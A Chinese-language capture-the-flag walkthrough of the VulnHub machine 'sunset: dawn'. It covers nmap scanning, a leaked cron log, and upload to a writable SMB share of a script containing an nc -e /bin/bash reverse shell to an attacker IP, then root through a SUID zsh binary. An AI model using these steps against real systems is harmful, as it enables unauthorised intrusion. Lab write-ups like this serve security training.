靶机地址：[sunset: dawn ~ VulnHub](https://www.vulnhub.com/entry/sunset-dawn,341/)
推荐：VirtualBox

主机发现、端口扫描、服务枚举
```Shell
sudo arp-scan -l
sudo nmap -p- "192.168.1.165"
sudo nmap -p "80,139,445,3306" -sV "192.168.1.165"
# 80/tcp   open  http        Apache httpd 2.4.38 ((Debian))
# 139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
# 445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
# 3306/tcp open  mysql       MySQL 5.5.5-10.3.15-MariaDB-1
```

逐个看下，先访问web服务，没什么东西，试试路径扫描
```Shell
sudo dirsearch -u "http://192.168.1.165"
# /logs/
```
`/logs/management.log` 中存在很多系统进程相关的内容
其中关键信息为
```
2022/12/12 22:10:45 CMD: UID=0    PID=700    | /bin/sh -c chmod 777 /home/dawn/ITDEPT/product-control
2022/12/12 22:10:46 CMD: UID=1000 PID=718    | /bin/sh -c /home/dawn/ITDEPT/product-control
```

访问SMB服务
```Shell
smbclient -L \\\\192.168.1.165
# print$
# ITDEPT
# IPC$
smbclient \\\\192.168.1.165\\ITDEPT
smb: \> help
smb: \> ls
# 没东西
smb: \> put test.txt
# 可写
# 先删了
smb: \> del test.txt
```
尝试写 `product-control`
本地创建文件，内容如下
```Shell
#!/bin/bash
nc -e /bin/bash 192.168.1.26 4444
```
上传
```Shell
smbclient //192.168.1.165/ITDEPT
smb: \> put product-control
```
经过等待，获取到了反弹shell
尝试提权
```Shell
id
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
find / -type f -user root -perm -u+sx -ls 2>/dev/null
# /usr/bin/zsh
/usr/bin/zsh
whoami
# root
```
提权成功